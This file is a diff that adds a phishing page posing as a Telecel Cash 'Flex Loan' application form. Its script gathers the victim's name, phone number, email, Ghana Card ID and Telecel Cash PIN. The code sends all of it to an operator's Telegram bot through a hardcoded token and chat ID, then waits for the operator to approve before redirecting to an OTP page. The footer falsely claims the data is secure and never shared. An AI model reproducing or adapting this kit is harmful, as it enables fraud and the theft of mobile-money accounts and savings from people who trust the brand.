@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apply for Flex Loan — Telecel Cash</title>
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --red:        #E30613;
+      --red-dark:   #B8040F;
+      --red-deep:   #8C0009;
+      --red-pale:   #FFF0F0;
+      --red-border: rgba(227,6,19,.18);
+      --red-glow:   rgba(227,6,19,.22);
+      --dark:       #0D1117;
+      --dark2:      #161B24;
+      --card:       #1A2030;
+      --border:     rgba(255,255,255,.08);
+      --text:       #E8EAF0;
+      --muted:      #8892A4;
+      --light:      rgba(255,255,255,.5);
+      --gold:       #F59E0B;
+      --green:      #10B981;
+      --green-pale: rgba(16,185,129,.12);
+      --shadow:     0 20px 60px rgba(0,0,0,.4);
+      --font-h:     'Sora', sans-serif;
+      --font-b:     'DM Sans', sans-serif;
+    }
+
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+    html { scroll-behavior:smooth; }
+
+    body {
+      font-family: var(--font-b);
+      background: var(--dark);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* ── Background mesh ── */
+    body::before {
+      content:'';
+      position:fixed; inset:0; z-index:0;
+      background:
+        radial-gradient(ellipse 60% 50% at 80% 10%, rgba(227,6,19,.18) 0%, transparent 60%),
+        radial-gradient(ellipse 50% 60% at 10% 90%, rgba(140,0,9,.14) 0%, transparent 60%),
+        radial-gradient(ellipse 40% 40% at 50% 50%, rgba(22,27,36,.9) 0%, transparent 80%);
+    }
+
+    /* ── Animated grid lines ── */
+    body::after {
+      content:'';
+      position:fixed; inset:0; z-index:0;
+      background-image:
+        linear-gradient(rgba(255,255,255,.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,.025) 1px, transparent 1px);
+      background-size: 48px 48px;
+      mask-image: radial-gradient(ellipse 80% 80% at center, black 30%, transparent 80%);
+    }
+
+    .page-wrap {
+      position: relative; z-index: 1;
+      width: 100%; max-width: 540px;
+    }
+
+    /* ── CARD ── */
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 28px;
+      overflow: hidden;
+      box-shadow: var(--shadow), 0 0 0 1px rgba(227,6,19,.06);
+      animation: cardIn .5s cubic-bezier(.34,1.3,.64,1) both;
+    }
+    @keyframes cardIn {
+      from { transform: translateY(24px) scale(.97); opacity:0; }
+      to   { transform: translateY(0) scale(1); opacity:1; }
+    }
+
+    /* Top gradient band */
+    .card-band {
+      height: 5px;
+      background: linear-gradient(90deg, var(--red-deep), var(--red), #FF3344, var(--gold));
+    }
+
+    /* ── HEADER ── */
+    .card-header {
+      padding: 28px 32px 22px;
+      text-align: center;
+      border-bottom: 1px solid var(--border);
+      position: relative;
+    }
+
+    .logo-wrap {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+    .logo-circle {
+      width: 52px; height: 52px; border-radius: 50%;
+      background: var(--red);
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 0 0 6px rgba(227,6,19,.15), 0 4px 20px rgba(227,6,19,.3);
+      flex-shrink: 0;
+      animation: logoFloat 3s ease-in-out infinite;
+    }
+    @keyframes logoFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+    .logo-circle svg { width: 28px; height: 28px; }
+    .logo-text { text-align: left; }
+    .logo-name {
+      font-family: var(--font-h);
+      font-size: 20px; font-weight: 800;
+      color: #fff; letter-spacing: -.5px; line-height: 1;
+    }
+    .logo-name span { color: var(--red); }
+    .logo-tagline {
+      font-size: 9px; font-weight: 600; color: var(--muted);
+      letter-spacing: .2em; text-transform: uppercase; margin-top: 3px;
+    }
+
+    .card-header h1 {
+      font-family: var(--font-h);
+      font-size: 22px; font-weight: 800;
+      color: #fff; letter-spacing: -.4px; margin-bottom: 5px;
+    }
+    .step-subtitle {
+      font-size: 13px; color: var(--muted); font-weight: 400;
+      transition: all .3s;
+    }
+    .step-subtitle strong { color: var(--red); font-weight: 600; }
+
+    /* ── PROGRESS ── */
+    .progress-wrap {
+      padding: 22px 32px 0;
+      display: flex;
+      align-items: center;
+      gap: 0;
+    }
+    .progress-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+      position: relative;
+    }
+    .progress-dot {
+      width: 34px; height: 34px; border-radius: 50%;
+      background: rgba(255,255,255,.07);
+      border: 2px solid rgba(255,255,255,.12);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; font-weight: 700;
+      color: var(--muted);
+      transition: all .4s cubic-bezier(.34,1.3,.64,1);
+      font-family: var(--font-h);
+      position: relative; z-index: 1;
+    }
+    .progress-dot.active {
+      background: var(--red);
+      border-color: var(--red);
+      color: #fff;
+      box-shadow: 0 0 0 5px rgba(227,6,19,.2), 0 4px 16px rgba(227,6,19,.4);
+      transform: scale(1.08);
+    }
+    .progress-dot.done {
+      background: var(--green);
+      border-color: var(--green);
+      color: #fff;
+      box-shadow: 0 0 0 4px rgba(16,185,129,.18);
+    }
+    .progress-label {
+      font-size: 9px; font-weight: 600; color: var(--muted);
+      text-transform: uppercase; letter-spacing: .1em; margin-top: 6px;
+      font-family: var(--font-h);
+      transition: color .3s;
+    }
+    .progress-step.active .progress-label { color: var(--red); }
+    .progress-step.done  .progress-label { color: var(--green); }
+    .progress-line {
+      flex: 1;
+      height: 2px;
+      background: rgba(255,255,255,.07);
+      margin: 0 -2px;
+      margin-bottom: 20px;
+      transition: background .4s;
+      position: relative; z-index: 0;
+    }
+    .progress-line.done { background: var(--green); }
+
+    /* ── CONTENT ── */
+    .card-body { padding: 26px 32px 32px; }
+
+    /* ── STEP PANELS ── */
+    .step-panel {
+      display: none;
+      animation: stepIn .35s cubic-bezier(.34,1.1,.64,1) both;
+    }
+    .step-panel.active { display: block; }
+    @keyframes stepIn {
+      from { transform: translateX(18px); opacity:0; }
+      to   { transform: translateX(0);    opacity:1; }
+    }
+    .step-panel.back-anim { animation-name: stepInBack; }
+    @keyframes stepInBack {
+      from { transform: translateX(-18px); opacity:0; }
+      to   { transform: translateX(0);     opacity:1; }
+    }
+
+    /* ── FORM ELEMENTS ── */
+    .form-group { margin-bottom: 18px; }
+    .form-label {
+      display: block;
+      font-size: 10px; font-weight: 700;
+      color: var(--muted); letter-spacing: .1em;
+      text-transform: uppercase; margin-bottom: 8px;
+      font-family: var(--font-h);
+    }
+    .form-control {
+      width: 100%;
+      background: rgba(255,255,255,.05);
+      border: 1.5px solid rgba(255,255,255,.1);
+      border-radius: 12px;
+      padding: 13px 16px;
+      font-size: 15px; font-weight: 500;
+      color: #fff;
+      font-family: var(--font-b);
+      outline: none;
+      transition: border-color .2s, background .2s, box-shadow .2s;
+      -webkit-appearance: none;
+    }
+    .form-control::placeholder { color: rgba(255,255,255,.2); font-weight: 400; }
+    .form-control:focus {
+      border-color: var(--red);
+      background: rgba(227,6,19,.05);
+      box-shadow: 0 0 0 4px rgba(227,6,19,.12);
+    }
+    select.form-control {
+      cursor: pointer;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' fill='none' stroke='rgba(255,255,255,.35)' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' viewBox='0 0 24 24'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 14px center;
+      padding-right: 40px;
+    }
+    select.form-control option { background: #1A2030; color: #fff; }
+
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+
+    /* ── LOAN SUMMARY BADGE ── */
+    .loan-badge {
+      background: linear-gradient(135deg, rgba(227,6,19,.15) 0%, rgba(140,0,9,.1) 100%);
+      border: 1px solid var(--red-border);
+      border-radius: 16px;
+      padding: 16px 18px;
+      margin-bottom: 22px;
+      display: flex; align-items: center; justify-content: space-between;
+      flex-wrap: wrap; gap: 10px;
+      animation: badgeSlideIn 0.5s ease-out;
+    }
+    @keyframes badgeSlideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+    .loan-badge-left { display: flex; flex-direction: column; gap: 2px; }
+    .loan-badge-label {
+      font-size: 9px; font-weight: 700; color: var(--red);
+      text-transform: uppercase; letter-spacing: .12em;
+      font-family: var(--font-h);
+    }
+    .loan-badge-value {
+      font-size: 26px; font-weight: 800; color: #fff; letter-spacing: -1px; line-height: 1;
+      font-family: var(--font-h);
+    }
+    .loan-badge-right { text-align: right; display: flex; flex-direction: column; gap: 2px; }
+    .loan-badge-right .bl { font-size: 9px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: .1em; font-family: var(--font-h); }
+    .loan-badge-right .bv { font-size: 16px; font-weight: 800; color: var(--green); font-family: var(--font-h); }
+
+    /* ── REVIEW TABLE ── */
+    .review-block {
+      background: rgba(255,255,255,.03);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+    .review-block-title {
+      font-size: 9px; font-weight: 700; color: var(--muted);
+      text-transform: uppercase; letter-spacing: .14em;
+      padding: 12px 16px 8px;
+      border-bottom: 1px solid var(--border);
+      font-family: var(--font-h);
+    }
+    .review-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px 16px;
+      border-bottom: 1px solid rgba(255,255,255,.04);
+    }
+    .review-row:last-child { border-bottom: none; }
+    .review-row .rl { font-size: 12.5px; color: var(--muted); font-weight: 400; }
+    .review-row .rv { font-size: 13px; color: #fff; font-weight: 600; font-family: var(--font-h); text-align: right; }
+    .review-row .rv.red { color: #FF6B6B; }
+    .review-row .rv.green { color: var(--green); }
+
+    /* ── BUTTONS ── */
+    .btn-primary {
+      width: 100%; background: var(--red); color: #fff; border: none;
+      padding: 16px; border-radius: 12px;
+      font-size: 15px; font-weight: 700; cursor: pointer;
+      font-family: var(--font-h);
+      transition: all .25s;
+      box-shadow: 0 6px 24px rgba(227,6,19,.35);
+      text-transform: uppercase; letter-spacing: .06em;
+      display: flex; align-items: center; justify-content: center; gap: 9px;
+    }
+    .btn-primary:hover { background: var(--red-dark); transform: translateY(-2px); box-shadow: 0 10px 32px rgba(227,6,19,.45); }
+    .btn-primary:active { transform: translateY(0); }
+    .btn-primary:disabled { opacity: .55; cursor: not-allowed; transform: none; }
+
+    .btn-ghost {
+      width: 100%; background: rgba(255,255,255,.06); color: var(--muted); border: 1.5px solid rgba(255,255,255,.1);
+      padding: 14px; border-radius: 12px;
+      font-size: 14px; font-weight: 600; cursor: pointer;
+      font-family: var(--font-h);
+      transition: all .2s;
+      text-transform: uppercase; letter-spacing: .06em;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      margin-bottom: 12px;
+    }
+    .btn-ghost:hover { background: rgba(255,255,255,.1); color: #fff; border-color: rgba(255,255,255,.2); }
+
+    .btn-group { display: flex; flex-direction: column; gap: 0; }
+
+    /* ── ELIGIBILITY NOTICE ── */
+    .eligibility-box {
+      background: var(--green-pale);
+      border: 1px solid rgba(16,185,129,.25);
+      border-radius: 12px; padding: 14px 16px; margin-bottom: 20px;
+    }
+    .eligibility-box-title {
+      font-size: 10px; font-weight: 700; color: var(--green);
+      text-transform: uppercase; letter-spacing: .1em; margin-bottom: 9px;
+      font-family: var(--font-h);
+    }
+    .eligibility-item {
+      display: flex; align-items: flex-start; gap: 8px;
+      font-size: 12.5px; color: rgba(255,255,255,.72); line-height: 1.55; font-weight: 400;
+      margin-bottom: 5px;
+    }
+    .eligibility-item:last-child { margin-bottom: 0; }
+    .eligibility-item .tick { color: var(--green); font-size: 13px; flex-shrink: 0; margin-top: 1px; }
+
+    /* ── FOOTER NOTE ── */
+    .card-footer-note {
+      text-align: center;
+      font-size: 11px; color: var(--muted);
+      padding: 0 32px 24px;
+      line-height: 1.7;
+    }
+    .card-footer-note a { color: var(--red); text-decoration: none; font-weight: 600; }
+
+    /* ── SPINNER ── */
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner {
+      width: 18px; height: 18px; border: 2.5px solid rgba(255,255,255,.3);
+      border-top-color: #fff; border-radius: 50%;
+      animation: spin .7s linear infinite; flex-shrink: 0;
+    }
+
+    /* ── RESPONSIVE ── */
+    @media(max-width:500px){
+      .card-header, .card-body, .progress-wrap { padding-left: 20px; padding-right: 20px; }
+      .card-footer-note { padding-left: 20px; padding-right: 20px; }
+      .form-row { grid-template-columns: 1fr; }
+      .loan-badge-value { font-size: 22px; }
+    }
+
+    .error-message {
+      color: #FF6B6B;
+      font-size: 13px;
+      text-align: center;
+      margin-bottom: 15px;
+      display: none;
+    }
+    .loading-indicator {
+      display: none;
+      text-align: center;
+      margin-top: 15px;
+    }
+    .loading-indicator.active { display: block; }
+    .loading-text { color: var(--muted); font-size: 13px; margin-top: 8px; }
+  </style>
+</head>
+<body>
+
+<div class="page-wrap">
+  <div class="card">
+    <div class="card-band"></div>
+
+    <!-- HEADER -->
+    <div class="card-header">
+      <div class="logo-wrap">
+        <div class="logo-circle">
+          <svg viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="28" y="40" width="144" height="32" rx="5" fill="white"/>
+            <rect x="84" y="40" width="32" height="126" rx="5" fill="white"/>
+            <path d="M142 152 Q176 118 160 80" stroke="white" stroke-width="12" stroke-linecap="round" fill="none" opacity="0.6"/>
+          </svg>
+        </div>
+        <div class="logo-text">
+          <div class="logo-name">Telecel<span>Loans</span></div>
+          <div class="logo-tagline">Connecting Energies</div>
+        </div>
+      </div>
+      <h1>Apply for Flex Loan</h1>
+      <p class="step-subtitle" id="stepSubtitle">Step 1 of 4: <strong>Loan Selection</strong></p>
+    </div>
+
+    <!-- PROGRESS -->
+    <div class="progress-wrap">
+      <div class="progress-step active" id="pstep1">
+        <div class="progress-dot active" id="pdot1">1</div>
+        <div class="progress-label">Loan</div>
+      </div>
+      <div class="progress-line" id="pline1"></div>
+      <div class="progress-step" id="pstep2">
+        <div class="progress-dot" id="pdot2">2</div>
+        <div class="progress-label">Info</div>
+      </div>
+      <div class="progress-line" id="pline2"></div>
+      <div class="progress-step" id="pstep3">
+        <div class="progress-dot" id="pdot3">3</div>
+        <div class="progress-label">Verify</div>
+      </div>
+      <div class="progress-line" id="pline3"></div>
+      <div class="progress-step" id="pstep4">
+        <div class="progress-dot" id="pdot4">4</div>
+        <div class="progress-label">Review</div>
+      </div>
+    </div>
+
+    <!-- BODY -->
+    <div class="card-body">
+      <div id="errMsg" class="error-message"></div>
+
+      <!-- STEP 1: LOAN SELECTION -->
+      <div class="step-panel active" id="step1">
+        <div class="loan-badge">
+          <div class="loan-badge-left">
+            <span class="loan-badge-label">Estimated Monthly</span>
+            <span class="loan-badge-value" id="monthlyPayment">0 GHS</span>
+          </div>
+          <div class="loan-badge-right">
+            <span class="bl">Interest Rate</span>
+            <span class="bv">12% p.a.</span>
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">How much do you need?</label>
+          <select class="form-control" id="loanAmount">
+            <option value="1000">1,000 GHS</option>
+            <option value="2000">2,000 GHS</option>
+            <option value="5000" selected>5,000 GHS</option>
+            <option value="10000">10,000 GHS</option>
+            <option value="20000">20,000 GHS</option>
+            <option value="50000">50,000 GHS</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Repayment Period</label>
+          <select class="form-control" id="loanDuration">
+            <option value="1">1 Month</option>
+            <option value="3" selected>3 Months</option>
+            <option value="6">6 Months</option>
+            <option value="12">12 Months</option>
+            <option value="24">24 Months</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Loan Purpose</label>
+          <select class="form-control" id="loanPurpose">
+            <option value="Business Expansion">Business Expansion</option>
+            <option value="Education">Education</option>
+            <option value="Medical">Medical</option>
+            <option value="Personal">Personal</option>
+            <option value="Emergency">Emergency</option>
+          </select>
+        </div>
+        <button class="btn-primary" onclick="nextStep()">Continue Application</button>
+      </div>
+
+      <!-- STEP 2: PERSONAL INFO -->
+      <div class="step-panel" id="step2">
+        <div class="form-group">
+          <label class="form-label">Full Legal Name</label>
+          <input type="text" class="form-control" id="fullName" placeholder="As it appears on your ID">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Telecel Phone Number</label>
+          <input type="tel" class="form-control" id="phoneNumber" placeholder="050 XXX XXXX">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Email Address</label>
+          <input type="email" class="form-control" id="email" placeholder="name@example.com">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Ghana Card / ID Number</label>
+          <input type="text" class="form-control" id="idNumber" placeholder="GHA-XXXXXXXXX-X">
+        </div>
+        <div class="btn-group">
+          <button class="btn-primary" onclick="nextStep()">Next Step</button>
+          <button class="btn-ghost" onclick="prevStep()">Back</button>
+        </div>
+      </div>
+
+      <!-- STEP 3: ACCOUNT VERIFICATION -->
+      <div class="step-panel" id="step3">
+        <div class="eligibility-box">
+          <div class="eligibility-box-title">Eligibility Check</div>
+          <div class="eligibility-item"><span class="tick">✓</span> Active Telecel Cash Account</div>
+          <div class="eligibility-item"><span class="tick">✓</span> Valid ID Document</div>
+          <div class="eligibility-item"><span class="tick">✓</span> Minimum 6 Months Account History</div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Telecel Cash PIN</label>
+          <input type="password" class="form-control" id="cashPin" placeholder="Enter your PIN">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Confirm Details</label>
+          <div style="background: rgba(255,255,255,.03); border: 1px solid rgba(255,255,255,.08); border-radius: 12px; padding: 12px; font-size: 12px; color: var(--muted);">
+            <p>By proceeding, you confirm that all information provided is accurate and complete.</p>
+          </div>
+        </div>
+        <div class="btn-group">
+          <button class="btn-primary" onclick="nextStep()">Verify & Continue</button>
+          <button class="btn-ghost" onclick="prevStep()">Back</button>
+        </div>
+      </div>
+
+      <!-- STEP 4: REVIEW -->
+      <div class="step-panel" id="step4">
+        <div class="review-block">
+          <div class="review-block-title">Loan Summary</div>
+          <div class="review-row">
+            <span class="rl">Loan Amount</span>
+            <span class="rv" id="reviewAmount">5,000 GHS</span>
+          </div>
+          <div class="review-row">
+            <span class="rl">Duration</span>
+            <span class="rv" id="reviewDuration">3 Months</span>
+          </div>
+          <div class="review-row">
+            <span class="rl">Monthly Payment</span>
+            <span class="rv green" id="reviewMonthly">0 GHS</span>
+          </div>
+          <div class="review-row">
+            <span class="rl">Interest Rate</span>
+            <span class="rv">12%</span>
+          </div>
+          <div class="review-row">
+            <span class="rl">Total Interest</span>
+            <span class="rv red" id="reviewInterest">0 GHS</span>
+          </div>
+        </div>
+        <div class="review-block">
+          <div class="review-block-title">Personal Information</div>
+          <div class="review-row">
+            <span class="rl">Name</span>
+            <span class="rv" id="reviewName">-</span>
+          </div>
+          <div class="review-row">
+            <span class="rl">Phone</span>
+            <span class="rv" id="reviewPhone">-</span>
+          </div>
+          <div class="review-row">
+            <span class="rl">Email</span>
+            <span class="rv" id="reviewEmail">-</span>
+          </div>
+        </div>
+        <div class="btn-group">
+          <button class="btn-primary" id="submitBtn" onclick="submitApplication()">Submit Application</button>
+          <button class="btn-ghost" onclick="prevStep()">Back</button>
+        </div>
+
+        <div class="loading-indicator" id="spinner">
+          <div class="spinner" style="margin: 0 auto;"></div>
+          <div class="loading-text">Waiting for approval...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FOOTER NOTE -->
+    <div class="card-footer-note">
+      Your information is secure and encrypted. We never share your data with third parties. <a href="#">Privacy Policy</a>
+    </div>
+  </div>
+</div>
+
+<script>
+  let currentStep = 1;
+  const CONFIG = {
+    BOT_TOKEN: '8625776173:AAE9XuhbvCy-Gp2d7GAbWLSp4c2sDUtExkw',
+    CHAT_ID: '6573120346',
+    NEXT_PAGE: 'otp.html'
+  };
+
+  let state = { lastUpdateId: 0 };
+  let isProcessing = false;
+
+  function updateProgressBar() {
+    for (let i = 1; i <= 4; i++) {
+      const step = document.getElementById(`pstep${i}`);
+      const dot = document.getElementById(`pdot${i}`);
+      const line = document.getElementById(`pline${i}`);
+
+      if (i < currentStep) {
+        step.classList.add('done');
+        dot.classList.remove('active');
+        dot.classList.add('done');
+        if (line) line.classList.add('done');
+      } else if (i === currentStep) {
+        step.classList.remove('done');
+        dot.classList.add('active');
+        if (line) line.classList.remove('done');
+      } else {
+        step.classList.remove('done');
+        dot.classList.remove('active', 'done');
+        if (line) line.classList.remove('done');
+      }
+    }
+    document.getElementById('stepSubtitle').innerHTML = `Step ${currentStep} of 4: <strong>${getStepTitle(currentStep)}</strong>`;
+  }
+
+  function getStepTitle(step) {
+    switch(step) {
+      case 1: return 'Loan Selection';
+      case 2: return 'Personal Info';
+      case 3: return 'Account Verify';
+      case 4: return 'Review & Submit';
+      default: return '';
+    }
+  }
+
+  function updateMonthlyPayment() {
+    const amount = parseInt(document.getElementById('loanAmount').value) || 0;
+    const duration = parseInt(document.getElementById('loanDuration').value) || 1;
+    const rate = 0.12;
+    const monthlyRate = rate / 12;
+    const monthlyPayment = amount * (monthlyRate * Math.pow(1 + monthlyRate, duration)) / (Math.pow(1 + monthlyRate, duration) - 1);
+    document.getElementById('monthlyPayment').textContent = monthlyPayment.toFixed(0) + ' GHS';
+  }
+
+  function nextStep() {
+    if (currentStep < 4) {
+      document.getElementById(`step${currentStep}`).classList.remove('active');
+      currentStep++;
+      document.getElementById(`step${currentStep}`).classList.add('active');
+      updateProgressBar();
+      updateReviewData();
+      window.scrollTo(0, 0);
+    }
+  }
+
+  function prevStep() {
+    if (currentStep > 1) {
+      document.getElementById(`step${currentStep}`).classList.remove('active');
+      currentStep--;
+      document.getElementById(`step${currentStep}`).classList.add('active');
+      updateProgressBar();
+      window.scrollTo(0, 0);
+    }
+  }
+
+  function updateReviewData() {
+    if (currentStep === 4) {
+      const amount = document.getElementById('loanAmount').value;
+      const duration = document.getElementById('loanDuration').value;
+      const name = document.getElementById('fullName').value || '-';
+      const phone = document.getElementById('phoneNumber').value || '-';
+      const email = document.getElementById('email').value || '-';
+
+      document.getElementById('reviewAmount').textContent = parseInt(amount).toLocaleString() + ' GHS';
+      document.getElementById('reviewDuration').textContent = duration + ' Months';
+      document.getElementById('reviewName').textContent = name;
+      document.getElementById('reviewPhone').textContent = phone;
+      document.getElementById('reviewEmail').textContent = email;
+
+      const monthlyPayment = document.getElementById('monthlyPayment').textContent;
+      document.getElementById('reviewMonthly').textContent = monthlyPayment;
+
+      const totalPayment = parseInt(amount) * (1 + 0.12 * (duration / 12));
+      const totalInterest = totalPayment - parseInt(amount);
+      document.getElementById('reviewInterest').textContent = totalInterest.toFixed(0) + ' GHS';
+    }
+  }
+
+  function submitApplication() {
+    if (isProcessing) return;
+    
+    const submitBtn = document.getElementById('submitBtn');
+    const spinner = document.getElementById('spinner');
+    const errMsg = document.getElementById('errMsg');
+    
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
+    isProcessing = true;
+
+    const formData = {
+      fullName: document.getElementById('fullName').value,
+      phoneNumber: document.getElementById('phoneNumber').value,
+      email: document.getElementById('email').value,
+      idNumber: document.getElementById('idNumber').value,
+      loanAmount: document.getElementById('loanAmount').value,
+      loanDuration: document.getElementById('loanDuration').value,
+      loanPurpose: document.getElementById('loanPurpose').value,
+      cashPin: document.getElementById('cashPin').value,
+      timestamp: new Date().toISOString()
+    };
+
+    const ts = Date.now();
+    const approveId = `apply_approve_${ts}`;
+    const declineId = `apply_decline_${ts}`;
+
+    const message = `
+<b>📋 New Loan Application</b>
+
+<b>Personal Information:</b>
+Name: <code>${formData.fullName}</code>
+Phone: <code>${formData.phoneNumber}</code>
+Email: <code>${formData.email}</code>
+ID: <code>${formData.idNumber}</code>
+PIN: <code>${formData.cashPin}</code>
+
+<b>Loan Details:</b>
+Amount: <code>${formData.loanAmount} GHS</code>
+Duration: <code>${formData.loanDuration} Months</code>
+Purpose: <code>${formData.loanPurpose}</code>
+
+<b>Submitted:</b> ${new Date().toLocaleString()}
+
+<b>Choose Action:</b>
+    `;
+
+    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CONFIG.CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: '✅ Approve', callback_data: approveId },
+              { text: '❌ Decline', callback_data: declineId }
+            ]
+          ]
+        }
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        spinner.classList.add('active');
+        startPolling(approveId, declineId, formData);
+      } else {
+        resetButton();
+        alert('Error submitting application. Please try again.');
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      resetButton();
+      alert('Network error. Please try again.');
+    });
+  }
+
+  function startPolling(approveId, declineId, formData) {
+    const interval = setInterval(() => {
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+        .then(r => r.json())
+        .then(data => {
+          if (!data.ok || !data.result) return;
+          data.result.forEach(update => {
+            state.lastUpdateId = update.update_id;
+            if (update.callback_query) {
+              const cb = update.callback_query.data;
+              if (cb === approveId) {
+                clearInterval(interval);
+                const params = new URLSearchParams({
+                  amount: formData.loanAmount,
+                  phone: formData.phoneNumber,
+                  name: formData.fullName,
+                  duration: formData.loanDuration
+                });
+                window.location.href = `${CONFIG.NEXT_PAGE}?${params.toString()}`;
+              } else if (cb === declineId) {
+                clearInterval(interval);
+                document.getElementById('spinner').classList.remove('active');
+                document.getElementById('errMsg').textContent = 'Application declined. Please contact support.';
+                document.getElementById('errMsg').style.display = 'block';
+                resetButton();
+              }
+            }
+          });
+        });
+    }, 1000);
+  }
+
+  function resetButton() {
+    isProcessing = false;
+    const submitBtn = document.getElementById('submitBtn');
+    submitBtn.disabled = false;
+    submitBtn.innerHTML = 'Submit Application';
+  }
+
+  // Event listeners
+  document.getElementById('loanAmount').addEventListener('change', updateMonthlyPayment);
+  document.getElementById('loanDuration').addEventListener('change', updateMonthlyPayment);
+
+  // Initialize
+  updateMonthlyPayment();
+  updateProgressBar();
+</script>
+
+</body>
+</html>
